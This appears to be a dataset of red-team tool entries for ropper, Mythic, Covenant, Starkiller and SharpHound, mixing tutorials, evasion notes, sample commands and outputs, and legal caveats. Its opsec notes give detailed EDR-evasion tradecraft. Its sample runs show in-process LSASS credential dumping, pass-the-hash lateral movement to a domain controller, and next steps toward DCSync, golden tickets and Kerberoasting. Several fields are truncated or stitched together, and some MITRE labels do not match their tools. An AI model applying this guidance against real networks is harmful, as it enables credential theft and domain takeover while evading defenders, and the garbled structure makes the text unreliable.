The --chain execve output is Python-ready pwntools code. Key observations for the advanced operator: (1) PIE means these gadget offsets are relative to the binary base — you need a leak (format string, partial overwrite, or GOT read) to resolve the runtime base before this chain is usable; (2) the /bin/sh address shown (0x00007f8a...) is a libc address — ropper is assuming a known libc base, which you must leak separately; (3) the syscall gadget at 0x0a1234 contains \x0a — if you hadn't used --badbytes, this chain would silently fail against a gets()-based overflow. Next steps: (1) leak a libc pointer via a format string or GOT partial overwrite, (2) calculate libc base = leaked_addr - known_offset (use 'readelf -s libc.so.6 | grep puts'), (3) plug the real base into pwntools with elf.address = leaked_base, (4) send the chain with pwntools process() or remote(). If the binary uses seccomp, pivot to a ret2syscall open/read/write chain instead of execve — use 'seccomp-tools dump ./hardened64' to enumerate allowed syscalls first.

legal_notes: US CFAA boundary (18 U.S.C. § 1030): ropper is a static binary analysis tool. Analyzing a binary you lawfully possess (your own code, a CTF challenge binary, a binary provided under a penetration testing engagement) is legal. Analyzing a binary extracted from a system you were not authorized to access — even if you never touch the live system again — can constitute a CFAA violation because the binary itself was obtained through unauthorized access. 'I only analyzed it locally' is not a defense if the binary was stolen.

Rules of engagement — scope of artifact analysis: In a paid red-team engagement, your statement of work (SOW) or rules of engagement (ROE) defines what you are authorized to analyze. Extracting and analyzing binaries from a client's production system (e.g., pulling a custom daemon off a server to find exploitable gadgets) may require explicit written authorization beyond a generic 'test the network' scope. Confirm with your client before pulling binaries off production hosts.

Modern cloud consideration: In cloud-native environments (AWS Lambda, Azure Functions, GCP Cloud Run), the 'binary' may be a container image layer or a compiled Go/Rust function artifact stored in a registry (ECR, ACR, Artifact Registry). Pulling and analyzing these images for ROP gadgets to exploit the runtime (e.g., a vulnerable shared library bundled in the container) is a legitimate attack path against container escapes. Ensure your engagement scope explicitly covers container image analysis and runtime exploitation, as these artifacts often contain proprietary code whose unauthorized analysis may violate both CFAA and the client's IP agreements.
false_positives: Gadget addresses in PIE binaries are offsets, not runtime addresses: ropper reports virtual addresses as they appear in the ELF, which for PIE binaries are relative to a base of 0x0 or a placeholder like 0x555555554000 depending on load address assumptions. Operators frequently paste these addresses directly into exploits and wonder why they crash — you must add the runtime base (leaked via info leak or calculated from /proc/PID/maps) before the chain is valid.

The --chain flag produces chains that assume a writable data segment for string placement: ropper's auto-generated execve chains often reference a .data or .bss address to store the '/bin/sh' string. If the binary has a non-standard memory layout, RELRO makes .got.plt read-only, or ASLR randomizes the data segment independently, the hardcoded data address in the generated chain will be wrong. Always verify writable segment addresses with 'readelf -S ./binary | grep -E ".data|.bss"' and cross-check against runtime maps.

Gadgets inside alignment padding or non-executable sections are reported but unusable: ropper sometimes surfaces gadgets that exist in ELF section padding bytes or in sections marked non-executable in the program headers. The gadget address looks valid but jumping to it will trigger a segfault or NX violation. Always cross-reference gadget addresses against 'readelf -l ./binary' to confirm the address falls within a PT_LOAD segment with execute permission.

MIPS and ARM gadget quality degrades significantly for Thumb/MIPS16 interworking: On ARM binaries that mix Thumb and ARM instruction sets, ropper can misidentify instruction boundaries and report gadgets that are actually mid-instruction sequences. The gadget disassembly looks plausible but the bytes are decoded from the wrong offset. Validate ARM/Thumb gadgets with a second tool (e.g., ROPgadget with --thumb flag, or manual capstone disassembly) before trusting them in a chain.

Gadgets in shared libraries are only valid if the library is loaded: ropper can analyze libc.so or any shared library independently, and operators often build chains from library gadgets. If the target binary doesn't actually load that library version at runtime (different distro, different libc version, musl vs glibc, statically linked binary), every gadget address is wrong. Confirm the exact library version loaded at runtime with 'ldd ./binary' or '/proc/PID/maps' before committing to library-sourced gadgets.

mitre_attack.name: Hijack Execution Flow: Dynamic Linker Hijacking

mythic.description: Multi-agent, multi-platform C2 framework. Docker-based, web UI. Hosts multiple agent types simultaneously (Apollo for Windows .NET, Apfell for macOS, Atlas for
mythic.teach_intro: Mythic's architecture is the key — agents and the server are decoupled, so the same Mythic instance can run Apollo (C# Windows beacon) and Apfell (macOS JXA) and Medusa (Python) concurrently in one engagement. Web UI shows callbacks, browser-renders task output, supports operator handoff. Standard go-to when teams need a free open-source alternative to Cobalt Strike with comparable usability.
opsec_notes: Beginner noise: Mythic's default HTTPS listener uses a self-signed TLS certificate. Any network inspection tool (Zeek, Suricata, corporate proxies) will flag the certificate's CN, O, and fingerprint as anomalous. Before deploying, generate a legitimate-looking cert via Let's Encrypt on a domain you control, or use a purchased wildcard cert. The self-signed cert is the single loudest artifact a first-time Mythic operator produces.

Mythic's web UI runs on port 7443 by default and the REST API on port 17443. Both are bound to 0.0.0.0 unless explicitly restricted. Shodan and Censys actively index port 7443 with the Mythic login page fingerprint — your teamserver WILL be discovered and attributed if exposed to the internet without firewall rules restricting access to operator IPs only. Use 'mythic-cli config set' to change default ports and bind to a VPN interface.

CrowdStrike Falcon and SentinelOne both maintain behavioral detections on the Apollo agent's default injection chain (CreateRemoteThread into a remote process via NtCreateThreadEx). As of 2025, Falcon's Kernel Sensor on Win11 22H2+ hooks NtCreateThreadEx at the kernel callback level (PsSetCreateThreadNotifyRoutine), meaning userland AMSI/ETW bypass alone is insufficient — Apollo's default shellcode injection will be caught. Use a custom agent profile with indirect syscalls or a hardware-breakpoint-based syscall stub to avoid this telemetry path.

Defender for Endpoint (MDE) on Windows 11 24H2 scores command-line entropy on child processes spawned by the Mythic agent's default post-ex commands. High-entropy base64 arguments (common in .NET reflection loading) trigger EID 4688 with a ProcessCreation alert tagged 'SuspiciousCommandLine'. Prefer in-process execution (BOF/COFF loading via Apollo's execute_coff task) over spawning child processes for post-ex work. MDE's process tree anomaly detection specifically flags agent -> cmd.exe -> powershell.exe chains.

Concrete defender artifact: Mythic's Apollo agent writes a named pipe with a default prefix of 'mojo.' during its SMB peer-to-peer lateral movement. Sysmon EID 17 (PipeCreated) and EID 18 (PipeConnected) will log this. Defenders with a Sysmon ruleset filtering on pipe name patterns will catch the default. Change the SMB pipe name in the Apollo build profile before generating the payload — it is a compile-time constant in the C2 profile JSON.

Mythic's callback traffic pattern — even over HTTPS — produces a metronomic beacon interval that network flow analysis (Zeek conn.log, Darktrace, ExtraHop) will flag as C2 beaconing within hours. Use jitter (set to 30-50% in the callback profile) and vary the sleep interval per implant. For high-security environments, consider a domain-fronted profile routing through a CDN (Cloudflare Workers or Azure CDN) so the destination IP resolves to a CDN edge node rather than your teamserver.

The operator should now open https://127.0.0.1:7443 in a browser, log in with the credentials set in the .env file (never leave the default password), and navigate to the 'Callbacks' tab to confirm the Apollo agent has checked in. A healthy callback will show the agent's hostname, username, PID, integrity level (High = admin, Medium = user), and last checkin timestamp. Next steps: (1) Verify the callback's integrity level — if Medium, run the 'getprivs' task to enumerate available privileges before attempting anything requiring elevation. (2) Run 'shell whoami /all' as your first task to confirm identity and group memberships. (3) Review the sleep and jitter settings on the callback — default is often 10s/0% which is loud.

sample_outputs.scenario: Advanced: Operator is mid-engagement on a hardened enterprise network (Win11 24H2, CrowdStrike Falcon deployed, EDR-aware defenders). Apollo agent is running as a medium-integrity process under a standard user account. Operator is using Mythic's task interface to load a custom COFF (BOF) for in-process credential access without spawning child processes, then pivoting via SMB to a second host using a harvested NTLM hash.
sample_outputs.command:
# In Mythic web UI task console for callback cb-0x4a2f (CORP\jsmith on WS-FINANCE-07)
# Task 1: Load and execute a custom COFF for LSASS handle duplication (in-process, no child spawn)
execute_coff --coff-file /opt/mythic/payloads/lsass_dup.o --args "" --timeout 60

# Task 2: After hash recovered, lateral movement via SMB to DC01
jump smb_exec --target 10.10.5.10 --payload apollo_smb_dc01.bin --username CORP\\svc_backup --hash aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
sample_outputs.output:

[+] COFF loaded into agent memory (in-process, no child spawn)
[+] COFF execution complete (2847ms)
[*] Output:
    [lsass_dup] Handle duplicated via NtDuplicateObject (PID 748)
    [lsass_dup] MiniDump written to agent memory buffer (47.2 MB)
    [lsass_dup] Parsing credentials in-process...
    [+] CORP\\Administrator : <NTHash: e19ccf75ee54e06b06a5907af13cef42>
    [+] CORP\\svc_backup    : <NTHash: 8846f7eaee8fb117ad06bdd830b7586c>
    [+] CORP\\jsmith        : <NTHash: 2b576acbe6bcfda7294d6bd18041b8fe>
[*] Task 2 queued: jump smb_exec (target: 10.10.5.10)
[+] SMB pipe established: \\\\10.10.5.10\\pipe\\custom_beacon_7f3a
[+] Payload delivered and executed
[+] New callback registered: cb-0x9b1c (CORP\\svc_backup on DC01) [HIGH integrity]
sample_outputs.explanation: Task 1 used a COFF (Beacon Object File compiled as a COFF for Apollo's execute_coff task) to duplicate the LSASS process handle and parse credentials entirely in-process — no child process spawned, no disk write, no AMSI trigger on a new process boundary. This avoids Falcon's process tree anomaly detection and MDE's EID 4688 entropy scoring. The recovered hashes can be passed directly. Task 2 used pass-the-hash over SMB to deliver a second Apollo payload (compiled with a custom SMB pipe name 'custom_beacon_7f3a' replacing the default 'mojo.' prefix) to the domain controller, achieving a HIGH integrity callback as svc_backup. Next steps: (1) On cb-0x9b1c (DC01, HIGH integrity), run 'dcsync --domain CORP.LOCAL --user krbtgt' to extract the krbtgt hash for a golden ticket — this is the crown jewel of AD compromise. (2) Verify svc_backup's AD rights with 'run_bof SharpHound' or query BloodHound data already collected to confirm DCSync rights exist before triggering the noisy replication RPC call. (3) Consider whether the engagement's rules of engagement permit DCSync — some scoped engagements explicitly exclude krbtgt extraction as a deliverable boundary.

legal_notes: CFAA (18 U.S.C. § 1030): Deploying a Mythic C2 agent on any system — even briefly, even as a test — without explicit written authorization from the system owner constitutes unauthorized access under the CFAA. The fact that Mythic is open-source and educational does not create any authorization. Verbal permission is legally insufficient. Your statement of work or rules of engagement must explicitly authorize C2 implant deployment, specify the authorized IP ranges, and be signed before any agent is generated.

Scope and rules of engagement: Mythic's lateral movement capabilities (SMB exec, WMI exec, SSH) make it trivially easy to pivot outside your authorized scope. Before executing any jump or lateral movement task, verify the destination IP is within the documented scope. Many engagements authorize compromise of a single subnet but not the domain controller or OOB management network — Mythic will happily pivot there if you ask it to. Scope violations during a paid engagement can void your contract, expose you to civil liability, and in some jurisdictions constitute a separate criminal offense.

Cloud and hybrid AD considerations: If the engagement scope includes Azure AD / Entra ID-joined endpoints or AWS SSM-managed instances, confirm that your rules of engagement explicitly cover cloud control plane actions. Mythic agents running on an Azure VM with a managed identity can make ARM API calls that affect the entire Azure subscription — actions that may be outside the intended scope of a traditional on-prem red team engagement. Get explicit written authorization for any cloud control plane interaction before tasking agents on cloud-joined hosts.
false_positives: Mythic's 'shell' task routes commands through cmd.exe or /bin/sh and captures output via a named pipe. On heavily loaded systems or those with aggressive process isolation (e.g., Windows Defender Application Control in audit mode), the pipe read can time out before the command completes, returning empty output. The operator may incorrectly conclude the command failed or the agent is dead — check the agent's last checkin time and re-issue with a longer timeout before assuming failure.

The 'ps' task on Windows enumerates running processes via NtQuerySystemInformation. On systems with PPL (Protected Process Light) processes or virtualization-based security (VBS) enabled, certain system processes will appear in the list but with empty or redacted command-line arguments. Operators may incorrectly flag these as hidden or suspicious processes when they are simply PPL-protected — cross-reference with a known-good process list for that OS version before reporting.

Apollo's 'inject' task reports success (exit code 0) when the shellcode is written and the remote thread is created — it does NOT confirm the injected payload executed successfully or that a new callback was received. On targets with CrowdStrike Falcon, the injection may succeed at the API level (thread created) but Falcon kills the thread microseconds later before execution. The operator sees 'inject: success' in Mythic but no new callback arrives — this is a false positive on the task success status, not a network issue.

Mythic's file browser task on Windows uses the agent's current token to enumerate directories. If the agent is running as a medium-integrity user with SeImpersonatePrivilege, the file browser may successfully list directories the user cannot actually read (due to ACL inheritance quirks on some enterprise file servers). The operator may believe they have read access to a sensitive share when they do not — always follow up a file browser listing with an explicit 'download' task to confirm actual read access.

The 'keylog' task on macOS (Apfell/Poseidon agents) requires Accessibility permissions granted to the parent process. On modern macOS (Ventura+) with TCC (Transparency, Consent, and Control) enforced, the keylogger will silently return empty output if TCC has not been bypassed — there is no error message, just no keystrokes captured. Operators may incorrectly conclude the target user is not typing anything when in fact TCC is silently blocking the hook.

covenant.description: .NET C2 framework with Blazor web UI. Older now (development slowed); replaced in active use by Sliver and Mythic for most teams. Still encountered in older lab
covenant.teach_intro: Covenant runs the C2 server in ASP.NET Core, agent 'Grunts' in .NET 4.0/4.5. Targets primarily Windows. Web UI is slick — task issuance, output rendering, operator chat. Has fallen out of favor mostly due to: (1) .NET implant signatures well-known to AV/EDR, (2) original maintainer's slower release cadence vs Sliver/Mythic. Worth knowing because legacy engagements still use it, and the architecture is a good case study in C2 design.
opsec_notes: Beginner noise: Covenant's default listener uses HTTP/HTTPS on common ports (80/443), but the default SSL certificate is self-signed with hardcoded Covenant-specific subject fields (CN=covenant, O=covenant). Any TLS inspection proxy or Zeek/Suricata JA3 fingerprinting will flag this certificate immediately. Replace the certificate with a legitimate or convincing CA-signed cert before any real engagement.

Grunt implants compiled directly from the Covenant web UI embed the default Covenant namespace structure (GruntTask, GruntTasking, Covenant.Core) in the .NET assembly metadata. CrowdStrike Falcon and Defender for Endpoint both maintain static signatures against these namespace strings as of 2024-2025. Any Grunt dropped without custom compilation and namespace obfuscation will be flagged on write or on first execution.

ETW-TI (Event Tracing for Windows Threat Intelligence) in Windows 11 22H2+ and Server 2022 instruments .NET runtime events at the CLR level via Microsoft-Windows-DotNETRuntime provider. Grunt's use of reflection-based task loading (Assembly.Load() at runtime) generates ETW events that SentinelOne and Defender for Endpoint correlate against process tree anomalies — specifically, a child process spawning from a .NET host with no corresponding disk artifact. This is a high-fidelity detection vector that namespace obfuscation alone does not defeat.

Concrete defender artifact: Covenant's default HTTP listener produces a characteristic User-Agent ('Mozilla/5.0 (Windows NT 6.1) Trident/7.0') and a fixed URI jitter pattern in beacon traffic. Zeek http.log and Suricata alert on this pattern. Network defenders with RITA (Real Intelligence Threat Analytics) will flag the beacon's regularity (low beacon jitter by default) as a long-connection/beaconing alert within hours. Always configure custom profiles and jitter >25% before deployment.

Sysmon EID 7 (ImageLoad) and EID 10 (ProcessAccess) are reliably triggered when Grunt executes post-exploitation tasks like Mimikatz-equivalent credential dumping via SharpKatz or token manipulation. These events, correlated with EID 1 (ProcessCreate) showing an unusual parent (e.g., IIS worker process w3wp.exe spawning a .NET child), are a near-certain detection in any mature SOC running Sysmon with the SwiftOnSecurity or Olaf Hartong config.

Advanced evasion gap: Covenant does not natively support process injection into remote processes for Grunt staging (unlike Sliver's BOF-based injection or Mythic's SOCKS proxy agents). Operators who attempt manual shellcode injection via Grunt tasks will find that the default implementation calls VirtualAllocEx + WriteProcessMemory + CreateRemoteThread — a sequence that has been a kernel callback detection target since Windows 10 1903 and is trivially caught by any EDR with kernel sensor. Custom BOF (Beacon Object File) support is absent in Covenant; this is a primary reason the tool has been deprecated in favor of Sliver for modern engagements.

'Jitter: 0%' is a critical red flag — this beacon will call home every exactly 5 seconds, which is trivially detected by any beaconing analysis tool. Before issuing any tasks, a beginner should immediately task the Grunt to increase jitter (Task > Set > Jitter 30) and understand that 'Process: powershell' is a high-visibility parent process. Executing a SharpHound collection task via Covenant's task interface to map AD attack paths, then pivoting to credential access.
sample_outputs.command:
# Issued via Covenant web UI task panel against Grunt 'GruntHTTP-4a2f':
# Task: SharpHound (built-in Covenant task wrapping SharpHound.exe)
# Parameters: CollectionMethod=All, Domain=corp.local, OutputDirectory=C:\Windows\Temp

sample_outputs.explanation: SharpHound has completed a full domain enumeration and written the zip to C:\Windows\Temp — a world-writable directory that avoids permission errors but is also heavily monitored by EDR file-write telemetry. The operator should immediately download and delete the artifact (Grunt task: Download then Shell 'del C:\Windows\Temp\20260514144503_BloodHound.zip'). Next steps: (1) Import the zip into BloodHound CE and run the 'Shortest Path to Domain Admin' query — look for Kerberoastable accounts with paths to DA, or ACL edges (WriteDACL, GenericAll) exploitable from the current user context. (2) If SPNTargets were collected, run a Kerberoasting task via Covenant's built-in Rubeus wrapper (Task > Rubeus > Kerberoast) to request TGS tickets for offline cracking with hashcat -m 13100. (3) If the BloodHound graph shows the current host has unconstrained delegation, pivot to Covenant's Rubeus Monitor task to capture TGTs from incoming authentications. Note: SharpHound's LDAP queries generate Windows Security EID 4662 (Object Access) and are visible in Defender for Identity as 'LDAP reconnaissance' alerts within minutes on a hardened domain — time-box this activity.

legal_notes: CFAA (18 U.S.C. § 1030) boundary: Covenant's Grunt implants, once deployed, establish persistent unauthorized access channels if left active beyond the engagement window. Operators must ensure all Grunts are killed and listeners torn down before the engagement end date specified in the signed Rules of Engagement. A Grunt left active on a client system after authorization expires constitutes unauthorized access under CFAA regardless of how it was originally deployed — the authorization is time-bounded.

Scope enforcement: Covenant's multi-listener architecture makes it easy to accidentally task a Grunt against a host outside the authorized IP scope, particularly when pivoting through a compromised host into adjacent network segments. Before issuing any lateral movement or pivot tasks, verify the target IP against the written scope document. Many RoE documents explicitly prohibit pivoting into OOB (out-of-band) network segments even if reachable from a compromised host — confirm in writing before proceeding.

Cloud and hybrid AD consideration: If the engagement scope includes Azure AD / Entra ID-joined or hybrid-joined Windows hosts, Covenant Grunts running on those hosts may inadvertently trigger Microsoft Entra ID Protection risk events (specifically 'Anomalous Token' or 'Unfamiliar sign-in properties') if the Grunt performs any token theft or PRT (Primary Refresh Token) abuse. These alerts surface in the client's Azure portal and may be visible to their security team outside the agreed engagement notification window — confirm with the client whether cloud identity alerts are in-scope and whether the SOC team is notified before executing any token-related tasks.
false_positives: Grunt 'Active' status in the Covenant UI does not guarantee the implant is actually alive on the target. If the target host rebooted or the process was killed, the Grunt will show as Active until the KillDate is reached or the next expected check-in window passes without response. Operators have wasted significant time issuing tasks to dead Grunts — always verify with a benign task (e.g., Shell 'whoami') and wait for a response before assuming the implant is responsive.

Covenant's built-in 'GetDomainUser' and 'GetNetLocalGroup' tasks use .NET LDAP bindings that can return incomplete results in environments with LDAP signing and channel binding enforced (default on Server 2022 DCs post-KB5008380). The task will report success with partial output rather than throwing an error, leading operators to believe they have a complete picture of domain users or local admins when they do not. Cross-validate with a manual SharpHound run or direct LDAP query.

The Covenant web UI's 'Integrity' field for a Grunt reports the token integrity level of the process at check-in time, not the current effective privileges. If an operator has performed token impersonation or used a Grunt task to elevate via a local exploit, the UI integrity field will NOT update — it remains stale from initial check-in. Always re-run a 'WhoAmI' or 'GetCurrentDirectory' task after any privilege escalation attempt to confirm actual current context.

Covenant's HTTP listener will report a Grunt as having checked in even if the response was served by a network device (load balancer, WAF, reverse proxy) that cached or intercepted the beacon. In environments with SSL inspection, the Grunt's encrypted channel may be terminated at the proxy, causing the server to log a check-in while the actual implant on the endpoint never received the response. This manifests as tasks that appear queued but never execute — a symptom operators frequently misdiagnose as a Grunt crash.

SharpHound tasks run via Covenant will occasionally report zero sessions collected in environments where Windows Defender Credential Guard is enforced and NetSessionEnum has been restricted via GPO (a common 2022+ hardening measure). The task exits cleanly with no error, leading operators to incorrectly conclude there are no active sessions on the domain — the data is simply unavailable via that collection method. Fall back to alternative session enumeration (e.g., querying event logs via Grunt Shell tasks against EID 4624 on target hosts) when session data appears suspiciously empty.

mitre_attack.name: Create or Modify System Process: Windows Service

starkiller.description: Modern Vue/Electron GUI front-end for Empire C2. Replaces Empire's CLI with a web interface — see all agents, queue modules, browse output, run listeners visual
starkiller.teach_intro: Empire's original CLI was clunky; Starkiller is the response. Same C2 backend (BC Security's Empire 4/5), Vue UI. Browse modules by tactic (recon, exfil, lateral), select target agent, fire. Pairs with the empire CLI for power-user workflows (custom modules, scripted automation), Starkiller for general operator use. If a class is teaching Empire today, they're showing Starkiller most of the time.
opsec_notes: Beginner noise: Starkiller itself is a web UI running on a local or remote port (default 1337). Every operator browser session to that port generates HTTP/S traffic. If the Empire server is on a shared host or VPS, those web logs are a forensic artifact — the operator's source IP is in the access log at /var/log/nginx/access.log or equivalent.

Empire listeners generate outbound C2 beacon traffic from the victim. Default HTTP/S listeners use a static User-Agent string ('Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko' in older profiles) that CrowdStrike Falcon's network inspection and Defender for Endpoint's NTA module flag as anomalous against the host's normal browser baseline. Always customize the malleable profile before deploying a listener.

SentinelOne and CrowdStrike Falcon both score PowerShell-based Empire agents heavily via command-line entropy analysis and AMSI telemetry. Empire's default PowerShell stager contains high-entropy base64 blobs that trip AMSI before execution. In 2025 engagements, IronPython or C# agents (Empire's 'csharp' agent type) with custom loaders are the baseline — raw PowerShell stagers are caught on arrival by any tuned EDR.

Defender for Endpoint (MDE) tracks parent-child process anomalies via ETW-TI. An Empire agent spawning cmd.exe or powershell.exe as a child of a non-interactive process (e.g., Word, Excel, a service host) generates a high-confidence alert under 'Suspicious process launched by Office application' or equivalent. Use process injection modules (e.g., Empire's 'inject_shellcode') to migrate into a more defensible parent process immediately after initial access.

Concrete defender artifact: Empire's default HTTPS listener uses a self-signed certificate with a static subject CN ('empire') and a fixed serial number pattern. Zeek/Bro and Suricata with the ET PRO ruleset detect this TLS fingerprint (JA3/JA3S hash) on the wire. Rotate to a Let's Encrypt cert on a legitimate-looking domain and customize the JA3 fingerprint via a custom listener profile before any live engagement.

Starkiller's module execution queues tasks via the Empire REST API (default: http://localhost:1337/api). If the Empire server is internet-exposed without authentication hardening, the API key (passed as ?token= in every request) can be captured in proxy logs or via network sniffing. Bind the Empire REST API to localhost only and tunnel operator access over SSH — never expose port 1337 to the internet.

The LogonServer points to DC01, which is the domain controller — a high-value lateral movement target. Windows Defender is active, meaning any further modules that drop files or run raw PowerShell will be scrutinized. Next logical steps: (1) run 'situational_awareness/network/powerview/get_domain_controller' to enumerate DC01's IP and role, (2) check for local privilege escalation paths via 'privesc/powerup/allchecks', (3) pivot to a C# or IronPython agent to reduce Defender exposure before running noisier modules.

sample_outputs.explanation: DCSync replicates directory data by impersonating a domain controller using the MS-DRSR protocol — it never touches LSASS on the target DC, making it quieter than a direct LSASS dump. The returned NTLM hash (8846f7...) is the domain Administrator's credential. Note: the LM hash shown is the well-known empty-password LM hash — in a real engagement verify the NTLM is non-trivial before assuming it's valid. Next steps: (1) pass-the-hash with crackmapexec ('cme smb DC01.CORP.LOCAL -u Administrator -H 8846f7...') to confirm hash validity, (2) use impacket's secretsdump.py for a full domain credential dump, (3) if Kerberos is preferred, use ticketer.py to forge a golden ticket from the krbtgt hash obtained in the same DCSync run.

legal_notes: CFAA boundary: Deploying an Empire agent and operating it via Starkiller constitutes unauthorized access under 18 U.S.C. § 1030 if performed against any system without explicit written authorization. The C2 callback alone — even if the agent does nothing — satisfies the 'access' element. A signed rules-of-engagement document specifying the target IP ranges, authorized techniques, and engagement window is mandatory before any listener is stood up.

Scope enforcement: Starkiller's agent list will show every active agent regardless of how it got there. In multi-operator engagements, agents can be accidentally tasked against out-of-scope hosts if the team doesn't maintain a strict asset register. Before executing any module, verify the agent's hostname and IP against the authorized scope list in the engagement's master document — Empire does not enforce scope boundaries for you.

Cloud/hybrid AD consideration: In environments with Azure AD (Entra ID) hybrid join or AD FS, DCSync and credential-harvesting modules may capture tokens or hashes that are valid against cloud resources (e.g., Azure management plane, M365). Exfiltrating or using these credentials against cloud infrastructure is a separate authorization boundary from the on-prem engagement scope. Confirm with the client whether cloud resources are in scope before any lateral movement that crosses the on-prem/cloud boundary.
false_positives: Agent 'checkin' timestamps in Starkiller can lag significantly behind real activity if the Empire server is under load or the beacon interval is long. An agent showing 'Last Seen: 8 minutes ago' may still be fully active — operators have prematurely killed and re-deployed agents because the UI made them look dead. Always check the raw task queue before assuming an agent is lost.

The 'IsAdmin' field returned by winenum and similar situational awareness modules reflects the token's current integrity level, not group membership. A user in the local Administrators group running a standard-integrity process will show IsAdmin: False. This has caused operators to skip privilege escalation steps on hosts where they already had admin rights — always cross-reference with 'whoami /groups' or a token-inspection module.

DCSync module output will return the LM hash 'aad3b435b51404eeaad3b435b51404ee' (the well-known empty/disabled LM hash) for any account where LM hashing is disabled (default since Server 2008). Operators unfamiliar with this have mistakenly concluded the account has no password or that the module failed. The NTLM hash in the same output is the valid credential — the LM portion is meaningless noise.

Empire's network enumeration modules (e.g., powerview wrappers) rely on LDAP queries that respect the agent's current Kerberos ticket and DNS resolution. In environments with split-horizon DNS or selective LDAP filtering, these modules will return incomplete or empty results without any error — the operator sees a blank output and assumes the domain has no objects matching the query, when in fact the query was silently filtered.

Starkiller's module search indexes on module name and description fields only. Searching for a technique (e.g., 'kerberoast') may miss relevant modules whose names use different terminology (e.g., 'GetUserSPNs'). Operators have concluded Empire lacks a capability it actually has because the UI search didn't surface it — always cross-reference with the Empire GitHub module directory or the CLI 'searchmodule' command.

sharphound.description: BloodHound's data collector. C# binary that runs on a domain-joined Windows host, queries AD via LDAP, collects user/group/computer/GPO/ACL relationships, outpu
sharphound.teach_intro: BloodHound is half the story; SharpHound is how you get the data INTO BloodHound. SharpHound.exe --CollectionMethods All on a low-priv domain user account, wait 10 minutes, get back zip of JSON files, drag into BloodHound — full graph of who can compromise whom. Modern EDR catches signed SharpHound binaries (Microsoft Defender has a signature), so red teamers often use SharpHound.ps1 (PowerShell port), AzureHound for Azure AD, or BloodHound.py for Linux operator boxes attacking via SOCKS proxy.
opsec_notes: BEGINNER NOISE: SharpHound.exe --CollectionMethods All generates a massive burst of LDAP queries from a single workstation account — hundreds to thousands of LDAP requests in under 10 minutes. Any SIEM with LDAP query volume baselining (e.g., Microsoft Sentinel analytic rule 'Suspicious LDAP Query Volume') will alert on this pattern immediately. The noise is proportional to domain size.

CONCRETE ARTIFACT — Windows Security Event Log EID 4662 is generated for every AD object access where auditing is enabled. A SharpHound 'All' collection on a 500-user domain can produce tens of thousands of EID 4662 entries from a single source account in minutes. Defenders with AD auditing enabled and a SIEM ingesting Security.evtx will see this as an obvious spike. Log path: Security.evtx on every DC queried.

CUTTING-EDGE 2025: Microsoft Defender for Identity (MDI) has a dedicated detection for BloodHound/SharpHound enumeration titled 'Active Directory attributes reconnaissance (LDAP)' — it fingerprints the specific LDAP filter patterns SharpHound uses (e.g., queries for ms-MCS-AdmPwd, adminCount=1, and specific ACL attribute pulls). Signed SharpHound.exe binaries are also flagged by Defender for Endpoint via file hash and PE metadata. As of 2024-2025, even the PowerShell port (SharpHound.ps1) triggers AMSI-based detection on patched Win11 24H2 endpoints unless AMSI is bypassed before invocation.

CUTTING-EDGE 2025: CrowdStrike Falcon's Behavioral Detection engine flags SharpHound via process tree anomaly: a low-privilege user process spawning SharpHound.exe with LDAP outbound connections to port 389/636 on multiple DCs in rapid succession scores high on Falcon's 'credential access' and 'discovery' kill-chain indicators. Falcon also detects the characteristic named-pipe and RPC calls SharpHound makes during session enumeration (--CollectionMethods Session). Operators should assume any signed or lightly-obfuscated SharpHound binary is burned on CrowdStrike-protected estates as of 2024.

EVASION CONTEXT: To reduce noise, use --CollectionMethods DCOnly (LDAP-only, no host-touching session/local-admin enumeration) combined with --Stealth flag, which randomizes query timing and skips the noisiest collection types. BloodHound.py run from a Linux operator box over a SOCKS proxy avoids dropping any binary on Windows hosts entirely — the LDAP traffic still hits the DC but there is no on-host process artifact. AzureHound is the equivalent for Entra ID / Azure AD and produces no on-prem Windows telemetry.

ARTIFACT — SharpHound writes a ZIP file to disk (default: current working directory, named with a timestamp like '20250514153022_BloodHound.zip'). This file write is visible to Sysmon EID 11 (FileCreate) and to any EDR with file-system telemetry. The ZIP contains JSON files with highly sensitive AD relationship data — leaving it on disk or exfiltrating it over cleartext channels is an OpSec failure. Delete immediately after retrieval and exfiltrate over an encrypted C2 channel.

sample_outputs.explanation: BloodHound.py completed DCOnly collection in 42 seconds via SOCKS proxy — no Windows binary dropped, no Sysmon EID 11 artifact, no CrowdStrike process tree alert. The 3 domain trusts are immediately high-value: inter-domain trust relationships are a classic lateral movement path (SID history abuse, trust ticket attacks). The WARNING about DCOnly is critical — you have ACL/group/GPO data but NO session or local-admin data, so BloodHound paths relying on 'HasSession' or 'AdminTo' edges will be incomplete. NEXT STEPS: (1) Import ZIP into BloodHound 4.x CE and run 'Find Principals with DCSync Rights' — any non-DA account with DCSync is an immediate path to domain compromise; (2) Run 'Shortest Paths to Domain Admins' filtered to ACL-only edges (GenericAll, WriteDacl, WriteOwner, GenericWrite) — these are exploitable without touching endpoints; (3) For the 3 trusts, use netdom query trust or Impacket's lookupsid.py to enumerate trusted domain SIDs and check for SID filtering gaps; (4) If a path involves a computer object with WriteDacl, chain with Impacket's rbcd.py for Resource-Based Constrained Delegation abuse.

legal_notes: CFAA (18 U.S.C. § 1030): SharpHound queries Active Directory via LDAP using authenticated credentials, but authorization to possess valid domain credentials does NOT imply authorization to enumerate the entire AD schema, ACL structure, and trust relationships. Running SharpHound on a domain you are not explicitly authorized to assess — even with a valid low-priv account — constitutes unauthorized access to a protected computer under the CFAA. Written authorization from the domain owner (not just the IT contact) is required before execution.

RULES OF ENGAGEMENT SCOPE: SharpHound --CollectionMethods All will query EVERY domain controller in the target domain and attempt to enumerate sessions on EVERY domain-joined computer in scope. If your engagement scope is limited to a specific subnet or a subset of systems, SharpHound's default behavior will violate that scope. Use --ComputerFile to restrict computer enumeration to a pre-approved list, and confirm with the client whether DC enumeration is in scope before running any collection.

MODERN AD / CLOUD CONSIDERATION: In hybrid environments with Entra ID (Azure AD) Connect, SharpHound data may reveal on-prem accounts that are synced to Azure AD, including their on-prem ACL relationships. Exfiltrating this data exposes cloud identity relationships that may be subject to additional data-handling requirements (GDPR, SOC 2 audit scope, cloud provider ToS). AzureHound output additionally contains Azure RBAC assignments and managed identity relationships — treat all BloodHound ZIP files as highly sensitive PII-adjacent data and handle per engagement data-handling agreements.
